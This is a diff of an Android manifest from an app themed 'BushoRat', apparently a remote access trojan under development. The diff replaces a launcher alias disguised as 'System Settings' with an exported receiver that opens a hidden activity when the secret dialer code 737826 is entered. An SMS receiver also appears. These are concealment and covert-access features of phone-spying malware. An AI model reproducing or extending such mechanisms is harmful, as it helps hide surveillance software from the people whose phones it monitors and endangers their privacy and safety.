@@ -139,6 +139,7 @@
         <activity-alias
             android:name=".MainLauncherAlias"
             android:targetActivity=".activities.ChooseLoginActivity"
+            android:enabled="true"
             android:exported="true"
             android:icon="@mipmap/ic_launcher"
             android:label="@string/app_name"
@@ -155,23 +156,23 @@
 
         <activity
             android:name=".activities.SecretLauncherActivity"
-            android:exported="true" />
-
-        <activity-alias
-            android:name=".SecretLauncherAlias"
-            android:targetActivity=".activities.SecretLauncherActivity"
-            android:exported="true"
-            android:icon="@mipmap/ic_launcher_round"
-            android:label="System Settings">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
+            android:exported="false"
+            android:theme="@style/Theme.BushoRat" />
         
         <activity
             android:name=".MainActivity"
-            android:exported="true" />
+            android:exported="false" />
+
+        <receiver
+            android:name=".reciever.SecretCodeReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data
+                    android:host="737826"
+                    android:scheme="android_secret_code" />
+            </intent-filter>
+        </receiver>
 
         <receiver
             android:name=".reciever.SMSReceiver"
